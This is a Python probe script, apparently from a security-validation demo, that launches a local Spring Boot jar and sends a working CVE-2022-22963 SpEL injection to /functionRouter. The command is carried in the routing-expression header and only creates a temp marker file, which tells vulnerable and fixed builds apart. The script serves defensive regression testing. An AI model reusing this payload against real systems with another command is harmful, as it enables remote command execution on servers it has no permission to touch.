#!/usr/bin/env python3
"""
Real runtime probe for the Spring Cloud Function SpEL RCE (CVE-2022-22963).

Starts the built Spring Boot app and sends the ACTUAL exploit: a single POST to
/functionRouter whose `spring.cloud.function.routing-expression` header carries a
SpEL command-execution payload. On the vulnerable dependency (<= 3.2.2) the
header is evaluated as SpEL before routing, so the command runs and drops a
marker file. On the fixed dependency (3.2.3+) the header is no longer evaluated,
so no command runs and no marker appears.

Safe by construction: the injected command only touches a unique temp file under
this job's workspace — no network callback, no persistence, no privilege use.
Observing whether that file appears is exactly where vulnerable and fixed
diverge.

Usage: python3 scripts/spel_probe.py <path-to-jar>
Prints CTEM_PROBE_RESULT=OPEN|CLOSED and exits 1 (open/vulnerable) or
0 (closed/fixed) — same pass/fail convention as the demo's other runtime probes.
"""
import os
import socket
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.request

PORT = 8080
BOOT_TIMEOUT_SECONDS = 90
EXEC_WAIT_SECONDS = 4


def _port_open(port: int) -> bool:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(1.0)
        return s.connect_ex(("127.0.0.1", port)) == 0


def _wait_for_boot(proc: subprocess.Popen, deadline: float) -> bool:
    while time.time() < deadline:
        if proc.poll() is not None:
            return False  # the app exited before opening the port
        if _port_open(PORT):
            return True
        time.sleep(1.0)
    return False


def main() -> int:
    if len(sys.argv) < 2:
        print("usage: spel_probe.py <path-to-jar>", file=sys.stderr)
        return 2
    jar_path = sys.argv[1]

    marker = os.path.join(tempfile.gettempdir(), f"ctem_spel_pwned_{os.getpid()}_{int(time.time())}")
    if os.path.exists(marker):
        os.remove(marker)

    print(f"[spel_probe] starting {jar_path}")
    proc = subprocess.Popen(
        ["java", "-jar", jar_path],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    try:
        if not _wait_for_boot(proc, time.time() + BOOT_TIMEOUT_SECONDS):
            print("[spel_probe] app did not open the port in time", file=sys.stderr)
            out = proc.stdout.read() if proc.stdout else ""
            print(out[-2000:], file=sys.stderr)
            print("CTEM_PROBE_RESULT=ERROR")
            return 2

        # exec via an argv array (not a single string) so the shell reliably
        # runs the touch regardless of argument splitting.
        payload = (
            'T(java.lang.Runtime).getRuntime().exec(new String[]'
            f'{{"/bin/sh","-c","touch {marker}"}})'
        )
        print("[spel_probe] POST /functionRouter with a SpEL routing-expression header")
        req = urllib.request.Request(
            f"http://127.0.0.1:{PORT}/functionRouter",
            data=b"ctem-spel-probe",
            method="POST",
            headers={
                "spring.cloud.function.routing-expression": payload,
                "Content-Type": "text/plain",
            },
        )
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                print(f"[spel_probe] response status {resp.status}")
        except urllib.error.HTTPError as exc:
            # A 500 is expected even when vulnerable: the SpEL runs as a side
            # effect, then routing fails on the non-function result.
            print(f"[spel_probe] response status {exc.code} (expected when the payload ran as a side effect)")
        except Exception as exc:  # pragma: no cover - defensive
            print(f"[spel_probe] request error: {exc}", file=sys.stderr)

        time.sleep(EXEC_WAIT_SECONDS)
        pwned = os.path.exists(marker)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            proc.kill()
        if os.path.exists(marker):
            try:
                os.remove(marker)
            except OSError:
                pass

    if pwned:
        print("CTEM_PROBE_RESULT=OPEN")
        print("[spel_probe] the injected command executed — exploit path is OPEN")
        return 1

    print("CTEM_PROBE_RESULT=CLOSED")
    print("[spel_probe] the injected command did not execute — exploit path is CLOSED")
    return 0


if __name__ == "__main__":
    sys.exit(main())
